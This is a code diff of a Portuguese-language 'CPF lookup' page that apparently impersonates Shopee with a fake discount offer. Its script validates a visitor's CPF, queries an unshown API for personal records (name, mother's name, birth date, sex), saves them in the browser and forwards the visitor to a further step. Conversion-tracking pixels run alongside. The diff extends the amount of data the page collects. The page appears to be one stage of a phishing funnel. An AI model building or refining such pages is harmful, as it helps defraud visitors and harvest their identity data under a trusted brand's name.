@@ -1,6 +1,7 @@
-<!DOCTYPE html><html lang="pt-BR">
-
-<head><meta http-equiv="content-type" content="text/html;charset=UTF-8">
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Consulta de CPF</title>
@@ -17,18 +18,15 @@
             flex-direction: column;
             min-height: 100vh;
         }
-
         .header {
             background-color: #ffffff;
             padding: 20px;
             text-align: center;
             border-bottom: 3px solid #ee4d2d;
         }
-
         .header img {
             width: 150px;
         }
-
         .main-content {
             max-width: 500px;
             background: #fff;
@@ -37,7 +35,6 @@
             border-radius: 10px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
-
         .btn-custom {
             color: white;
             border: none;
@@ -50,13 +47,11 @@
             letter-spacing: .3px;
             line-height: 1.15;
         }
-
         .btn-custom:hover {
             color: white !important;
             background-color: #000 !important;
             transform: scale(1.02) !important;
         }
-
         .footer {
             background: #ffffff;
             border-top: 1px solid #e6e6e6;
@@ -66,7 +61,6 @@
             color: #666;
             margin-top: auto;
         }
-
         .result-box {
             margin-top: 20px;
             background-color: #f9f9f9;
@@ -76,29 +70,24 @@
             display: none;
             text-align: left;
         }
-
         .result-box p {
             margin: 0 0 10px;
         }
-
         .loader {
             display: none;
             text-align: center;
             margin-bottom: 15px;
         }
-
         .loader img {
             width: 50px;
             height: 50px;
         }
-
         .success-message {
             text-align: center;
             font-weight: bold;
             color: green;
             margin-bottom: 15px;
         }
-
         .success-message img {
             width: 50px;
             height: 50px;
@@ -123,6 +112,7 @@
             </div>
         </form>
         <button id="consultarBtn" class="btn-custom" onclick="submitLog()">Consultar CPF</button>
+
         <div id="loader" class="loader">
             <img src="images/21-18-05-265_512.gif" alt="Carregando...">
             <p>Consultando seus dados e desconto...</p>
@@ -134,8 +124,9 @@
                 <img src="images/6784655.png" alt="Aprovado">
                 <p>Desconto aplicado com sucesso para:</p>
             </div>
-            <p>Iniciando cadastro de <strong><span id="nomeCompleto"></span></strong></p>
-            <p><strong>Nome da Mãe:</strong> <span id="nomeMae"></span></p>
+            <p><strong>Nome:</strong> <span id="nomeCompleto"></span></p>
+            <p><strong>CPF:</strong> <span id="cpfMostrar"></span></p>
+            <p><strong>Data de Nascimento:</strong> <span id="dataNascimento"></span></p>
             <p><strong>Sexo:</strong> <span id="sexo"></span></p>
             <button class="btn-custom" onclick="continuar()">Continuar</button>
         </div>
@@ -148,64 +139,70 @@
             const res = await fetch(url);
             return await res.json();
         }
-    
+
         function validaCPF(strCPF) {
             let Soma = 0;
             let Resto;
             if (strCPF == "00000000000") return false;
-    
             for (let i = 1; i <= 9; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (11 - i);
             Resto = (Soma * 10) % 11;
-    
             if ((Resto == 10) || (Resto == 11)) Resto = 0;
             if (Resto != parseInt(strCPF.substring(9, 10))) return false;
-    
             Soma = 0;
             for (let i = 1; i <= 10; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (12 - i);
             Resto = (Soma * 10) % 11;
-    
             if ((Resto == 10) || (Resto == 11)) Resto = 0;
             if (Resto != parseInt(strCPF.substring(10, 11))) return false;
             return true;
         }
-    
+
         async function submitLog() {
             const cpf = document.getElementById("cpf").value.replace(/-/g, "").replace(/\./g, "");
             const loader = document.getElementById("loader");
             const resultBox = document.getElementById("resultBox");
             const consultarBtn = document.getElementById("consultarBtn");
-    
+
             if (!validaCPF(cpf)) {
                 alert("CPF inválido!");
                 return;
             }
-    
+
             loader.style.display = "block";
             consultarBtn.style.display = "none";
             resultBox.style.display = "none";
-    
+
             try {
                 const responseCPF = await getCPF(cpf);
-    
-                setTimeout(() => {
-                    const nomeCompleto = responseCPF.DADOS.NOME || "Não encontrado";
-                    const nomeMae = responseCPF.DADOS.NOME_MAE || "Não encontrado";
-                    const sexo = responseCPF.DADOS.SEXO || "Não encontrado";
-    
-                    document.getElementById("nomeCompleto").innerText = nomeCompleto;
-                    document.getElementById("nomeMae").innerText = nomeMae;
-                    document.getElementById("sexo").innerText = sexo;
-    
-                    // Salvar os dados no localStorage
-                    localStorage.setItem("dadosCPF", JSON.stringify({
-                        nomeCompleto,
-                        nomeMae,
-                        sexo
-                    }));
-    
-                    loader.style.display = "none";
-                    resultBox.style.display = "block";
-                }, 3000);
+                console.log("Resposta da API:", responseCPF); // Para debug
+
+                // CORREÇÃO AQUI: Acessando os dados corretamente
+                const dados = responseCPF.DADOS || responseCPF.dados || {};
+
+                const nomeCompleto = dados.nome || dados.NOME || "Não encontrado";
+                const nomeMae = dados.nome_mae || dados.NOME_MAE || "Não encontrado";
+                const dataNascimento = dados.data_nascimento || dados.DATA_NASCIMENTO || "Não encontrado";
+                const sexo = dados.sexo || dados.SEXO || "Não encontrado";
+
+                // Formatar CPF para exibição
+                const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+
+                document.getElementById("nomeCompleto").innerText = nomeCompleto;
+                document.getElementById("cpfMostrar").innerText = cpfFormatado;
+                document.getElementById("dataNascimento").innerText = dataNascimento;
+                document.getElementById("sexo").innerText = sexo === "I" ? "Indefinido" : (sexo === "M" ? "Masculino" : "Feminino");
+
+                // Salvar os dados no localStorage
+                localStorage.setItem("dadosCPF", JSON.stringify({
+                    nomeCompleto,
+                    nomeMae,
+                    dataNascimento,
+                    sexo,
+                    cpf: cpfFormatado
+                }));
+
+                loader.style.display = "none";
+                resultBox.style.display = "block";
+
             } catch (error) {
                 console.error("Erro na consulta:", error);
                 alert("Erro ao consultar o CPF. Tente novamente.");
@@ -213,53 +210,62 @@
                 consultarBtn.style.display = "block";
             }
         }
-    
+
         function continuar() {
             window.location.href = '/5/index.html' + window.location.search;
         }
+
+        // Máscara para o campo CPF
+        document.getElementById("cpf").addEventListener("input", function(e) {
+            let value = e.target.value.replace(/\D/g, "");
+            if (value.length > 11) value = value.slice(0, 11);
+            value = value.replace(/(\d{3})(\d)/, "$1.$2");
+            value = value.replace(/(\d{3})(\d)/, "$1.$2");
+            value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+            e.target.value = value;
+        });
     </script>
 
     <!-- Footer -->
     <div class="footer">
-Copyright © 2025 Shopee. Todos os direitos reservados.<br>
-
-Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+        Copyright © 2025 Shopee. Todos os direitos reservados.<br>
+        Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
     </div>
 
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+    <script>
+        window.pixelId = "67a2ccee407daa3589707502";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
 
-<script>
-  window.pixelId = "67a2ccee407daa3589707502";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
-
-<!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1305780857141681');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1305780857141681&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
-
-
+    <!-- Meta Pixel Code -->
+    <script>
+        ! function(f, b, e, v, n, t, s) {
+            if (f.fbq) return;
+            n = f.fbq = function() {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n;
+            n.push = n;
+            n.loaded = !0;
+            n.version = '2.0';
+            n.queue = [];
+            t = b.createElement(e);
+            t.async = !0;
+            t.src = v;
+            s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '1305780857141681');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1305780857141681&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
 </body>
 </html>
